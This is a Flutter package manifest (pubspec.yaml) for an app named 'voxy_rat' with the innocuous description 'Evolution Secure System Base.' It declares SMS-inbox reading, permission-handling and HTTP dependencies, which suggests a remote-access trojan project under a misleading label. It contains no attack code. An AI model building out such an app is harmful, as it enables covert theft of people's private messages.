name: voxy_rat
description: Evolution Secure System Base.
version: 1.0.0+1

environment:
  sdk: ">=2.17.0 <4.0.0"

dependencies:
  flutter:
    sdk: flutter
  http: ^1.1.0
  torch_light: ^1.0.1
  flutter_sms_inbox: ^1.0.2
  permission_handler: ^11.0.1
  path_provider: ^2.1.1

flutter:
  uses-material-design: true
